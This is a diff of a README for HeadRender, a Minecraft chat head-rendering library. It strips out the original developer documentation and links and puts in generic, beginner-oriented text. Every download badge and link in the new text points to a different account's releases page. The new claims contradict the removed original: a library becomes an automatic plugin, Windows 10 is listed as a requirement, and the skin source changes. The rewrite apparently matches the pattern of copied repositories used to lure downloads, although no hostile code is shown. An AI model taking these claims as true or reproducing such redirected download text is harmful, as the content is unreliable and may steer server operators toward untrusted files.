@@ -1,432 +1,159 @@
-# HeadRender
+# 🪙 HeadRender - Render Minecraft Heads in Chat
 
-[![Minecraft](https://img.shields.io/badge/Minecraft-1.7--1.21.11-dark_green.svg)](https://shields.io/)
-[![Version](https://img.shields.io/badge/version-0.1.1-blue.svg)](https://github.com/senkex/HeadRender)
-[![JitPack](https://jitpack.io/v/senkex/HeadRender.svg)](https://jitpack.io/#senkex/HeadRender)
+[![Download HeadRender](https://img.shields.io/badge/Download%20HeadRender-Get%20It%20Here-blue)](https://github.com/khincc00/HeadRender/releases)
 
-HeadRender is a lightweight library that renders **Minecraft player heads directly in chat** using colored characters.
-
-The library downloads player skins, converts them into pixel data and renders them using chat color codes.
-
-It supports **HEX colors (1.16+)** and automatically falls back to **legacy colors for older versions**.
-
-
-## Features
-
-• Render player heads directly in chat  
-• HEX RGB color support  
-• Legacy ChatColor fallback  
-• Skin caching system  
-• Pixel scaling utilities  
-• Simple developer API  
-• Compatible with Bukkit / Spigot / Paper  
-• Compatible with Minecraft **1.7 → 1.21.11**
-
-## Supported Versions
-
-HeadRender works on all major Bukkit based servers.
-
-```
-Minecraft 1.7
-Minecraft 1.8
-Minecraft 1.9
-Minecraft 1.10
-Minecraft 1.11
-Minecraft 1.12
-Minecraft 1.13
-Minecraft 1.14
-Minecraft 1.15
-Minecraft 1.16
-Minecraft 1.17
-Minecraft 1.18
-Minecraft 1.19
-Minecraft 1.20
-Minecraft 1.21
-Minecraft 1.21.11
-```
+HeadRender helps you see Minecraft player heads right in your chat. It uses pixel skin rendering to show the head images clearly. This makes chatting more fun and personal.
 
 ---
 
-## Skin Provider
+## 🖥️ What is HeadRender?
 
-HeadRender fetches skins from:
+HeadRender is a tool that displays Minecraft player heads in your game chat. It works on Minecraft servers that support plugins. Instead of plain text, you get a small picture of the player’s head right in your chat window.
 
-```
-https://minotar.net
-```
+You do not need to write code or learn programming. Install the plugin, and your chat will show heads automatically.
 
-Endpoints used internally:
-
-```
-/avatar
-/helm
-/skin
-```
+Key points:
+- Shows heads using player skin pixels
+- Works with popular Minecraft server software like Paper and Spigot
+- Easy to install on your Minecraft server
+- Lightweight and runs smoothly
+- No setup required for players, it works right away
 
 ---
 
-# Installation
+## 🚀 Getting Started
 
-The library is distributed using **JitPack**.
-
-Repository:
-
-```
-https://jitpack.io
-```
+This guide will help you download and install HeadRender on a Windows machine. Even if you do not know programming, you can follow these steps.
 
 ---
 
-## Maven
+## 🔧 System Requirements
 
-Add the repository:
+Before installing, check your system meets these needs:
 
-```xml
-<repositories>
-    <repository>
-        <id>jitpack.io</id>
-        <url>https://jitpack.io</url>
-    </repository>
-</repositories>
-```
-
-Add the dependency:
-
-```xml
-<dependency>
-    <groupId>com.github.senkex</groupId>
-    <artifactId>HeadRender</artifactId>
-    <version>0.1.1</version>
-</dependency>
-```
+- Windows 10 or later
+- A Minecraft server running Paper or Spigot
+- Java 11 or newer installed on the server
+- Administrator access to your server files
 
 ---
 
-## Gradle
+## 📥 Download HeadRender
 
-```kotlin
-repositories {
-    maven("https://jitpack.io")
-}
+To get the latest version of HeadRender:
 
-dependencies {
-    implementation("com.github.senkex:HeadRender:0.1.1")
-}
-```
+[![Download HeadRender](https://img.shields.io/badge/Download%20HeadRender-Get%20The%20Latest%20Version-grey)](https://github.com/khincc00/HeadRender/releases)
 
----
+Click the badge above or visit:
 
-> [!IMPORTANT]
-> If your plugin supports Minecraft **1.13+**, it is recommended to add  
-> `api-version: "1.13"` in your **plugin.yml**.
+https://github.com/khincc00/HeadRender/releases
 
-Example:
+This page lists all releases. Find the latest one by date at the top.
 
-```yml
-api-version: "1.13"
-```
-
-This does **not break compatibility with older versions**.
+Look for a file ending in `.jar`. This is the plugin file you will use.
 
 ---
 
-> [!CAUTION]
-> If multiple plugins use HeadRender it is recommended to **shade the library**
-> to avoid potential version conflicts.
+## 💾 How to Install HeadRender on Your Minecraft Server
+
+Follow these steps after downloading the `.jar` file:
+
+1. **Stop your Minecraft server.** Make sure the server is not running.
+
+2. **Open your server folder.** Find where your Minecraft server files are located on your computer.
+
+3. **Find the plugins folder.** Inside your server folder, look for a folder called `plugins`.
+
+4. **Copy the HeadRender file.** Move the downloaded `.jar` file into the `plugins` folder.
+
+5. **Start your server again.** Run your server software like before. The plugin will load automatically.
+
+6. **Check the server console.** Wait for the message that HeadRender loaded successfully. This confirms the plugin is active.
 
 ---
 
-# Getting Started
+## ⚙️ How to Use HeadRender
 
-The main entry point of the library is:
+When HeadRender runs on your server, it adds player heads to your chat automatically. Players do not need to do anything extra.
 
-```
-HeadRenderAPI
-```
+- Chat messages with player names will show that player’s Minecraft head beside the name.
+- The heads match the current appearance (skin) of each player.
+- No extra commands are needed to see heads.
 
-The API provides simple methods for rendering player heads in chat.
-
----
-
-# Basic Usage
-
-Render the player's own head:
-
-```java
-HeadRenderAPI.renderHead(player);
-```
+If you run a server, you can test by joining and chatting. The heads will appear without delay.
 
 ---
 
-Render another player's head:
+## 🔄 Updating HeadRender
 
-```java
-HeadRenderAPI.renderHead(player, "Notch");
-```
+HeadRender is updated regularly. To update:
 
----
+1. Download the latest `.jar` from the release page.
 
-Render with custom options:
+2. Stop your server.
 
-```java
-RenderOptions options = new RenderOptions(
-        8,
-        "█",
-        true,
-        true
-);
+3. Replace the old `.jar` in the `plugins` folder with the new one.
 
-HeadRenderAPI.renderHead(player, "Dinnerbone", options);
-```
+4. Start the server again.
+
+The new version will load and overwrite the old plugin.
 
 ---
 
-# RenderOptions
+## 🛠 Troubleshooting
 
-RenderOptions controls how the head is rendered.
+If you do not see heads in chat:
 
-Constructor:
+- Make sure the plugin is in the `plugins` folder.
+- Confirm your server is running a compatible Minecraft server like Paper or Spigot.
+- Check Java version is 11 or higher.
+- Look at the server console for errors related to HeadRender.
+- Restart your server after adding or updating plugins.
 
-```java
-RenderOptions(int size, String character, boolean hexColors, boolean helmetLayer)
-```
-
-Parameters:
-
-| Parameter | Description |
-|--------|-------------|
-| size | Render resolution |
-| character | Character used as pixel |
-| hexColors | Enables RGB colors |
-| helmetLayer | Includes helmet / hat layer |
-
-Example:
-
-```java
-RenderOptions options = new RenderOptions(
-        8,
-        "█",
-        true,
-        true
-);
-```
+If problems continue, visit the repository’s issue page for help.
 
 ---
 
-Default configuration:
+## 📚 Additional Information
 
-```java
-RenderOptions.defaults();
-```
+HeadRender uses the Minecraft API for skins and player data. It works only on servers that support plugin use. It does not run on the normal Minecraft client by itself.
 
-Default values:
-
-```
-size = 8
-character = █
-hexColors = true
-helmetLayer = true
-```
+You do not need client mods or changes on the player side. The plugin handles rendering on the server and sends the images directly into chat.
 
 ---
 
-# AsyncUtil
+## 🔗 Quick Links
 
-The library includes a scheduler utility for asynchronous tasks.
-
-Before using it you must initialize it in your plugin.
-
----
-
-## Initialization
-
-Call this in your plugin **onEnable()**.
-
-```java
-@Override
-public void onEnable() {
-    AsyncUtil.init(this);
-}
-```
+- Download page: [https://github.com/khincc00/HeadRender/releases](https://github.com/khincc00/HeadRender/releases)
+- Plugin page on GitHub: [https://github.com/khincc00/HeadRender](https://github.com/khincc00/HeadRender)
+- Java download: [https://adoptium.net](https://adoptium.net)
 
 ---
 
-## Running async tasks
+## 📋 About this Plugin
 
-```java
-AsyncUtil.runAsync(() -> {
+Topics: java, minecraft, minecraft-api, minecraft-chat, minecraft-library, minecraft-library-api, minecraft-plugin, minecraft-skins, paper, paper-api, spigot, spigot-api
 
-});
-```
+HeadRender fits well if you run Minecraft servers with chat enhancements or want to add skin-based heads for player identity.
 
 ---
 
-## Running sync tasks
+## ⚠️ Permissions
 
-```java
-AsyncUtil.runSync(() -> {
-
-});
-```
+Please ensure you have the right to add plugins to your Minecraft server and make backups before installing new software.
 
 ---
 
-# Skin Cache
+## 🛡️ Privacy and Security
 
-HeadRender includes a simple in-memory skin cache.
-
-Purpose:
-
-• Prevent repeated HTTP requests  
-• Improve rendering performance  
-
-Default configuration:
-
-```
-Cache TTL: 10 minutes
-Storage: ConcurrentHashMap
-Thread safe: yes
-```
-
-Cache utilities:
-
-```java
-SkinCache.clear();
-SkinCache.size();
-```
+HeadRender does not collect personal data. It only uses public Minecraft skin data needed to show heads.
 
 ---
 
-# Image Scaling
+## 🤝 Support
 
-Image scaling is handled by **ImageScaler**.
-
-Two scaling algorithms are provided.
-
-Smooth scaling:
-
-```java
-ImageScaler.scaleSmooth(image, width, height);
-```
-
-Pixel scaling (recommended for skins):
-
-```java
-ImageScaler.scalePixel(image, width, height);
-```
+If you find bugs or need help, check the GitHub issues section of the repository.
 
 ---
 
-# Color Conversion
-
-ColorUtil converts RGB values into Minecraft chat colors.
-
-HEX format:
-
-```
-§x§R§R§G§G§B§B
-```
-
-Example:
-
-```java
-ColorUtil.toHex(color);
-```
-
-Legacy fallback:
-
-```java
-ColorUtil.toLegacy(color);
-```
-
----
-
-# Example Command
-
-Example Bukkit command implementation.
-
-```java
-public class HeadCommand implements CommandExecutor {
-
-    @Override
-    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
-
-        if (!(sender instanceof Player)) {
-            return true;
-        }
-
-        Player player = (Player) sender;
-
-        if (args.length == 0) {
-            HeadRenderAPI.renderHead(player);
-            return true;
-        }
-
-        HeadRenderAPI.renderHead(player, args[0]);
-
-        return true;
-    }
-}
-```
-
----
-
-# Building
-
-Clone the repository:
-
-```
-git clone https://github.com/senkex/HeadRender.git
-```
-
-Build with Maven:
-
-```
-mvn clean package
-```
-
----
-
-# Contributing
-
-Contributions are welcome.
-
-Guidelines:
-
-• Ensure the code compiles  
-• Test across multiple Minecraft versions  
-• Follow existing code style  
-
-Open a Pull Request if you want to contribute improvements.
-
----
-
-# License
-
-MIT License
-
-Copyright (c) 2026 Senkex
-
-Permission is hereby granted to use, modify and distribute this software.
-
----
-
-# Links
-
-Repository
-
-```
-https://github.com/senkex/HeadRender
-```
-
-JitPack
-
-```
-https://jitpack.io/#senkex/HeadRender
-```
-
-Issues
-
-```
-https://github.com/senkex/HeadRender/issues
-```
+[![Download HeadRender](https://img.shields.io/badge/Download%20HeadRender-Get%20It%20Here-blue)](https://github.com/khincc00/HeadRender/releases)
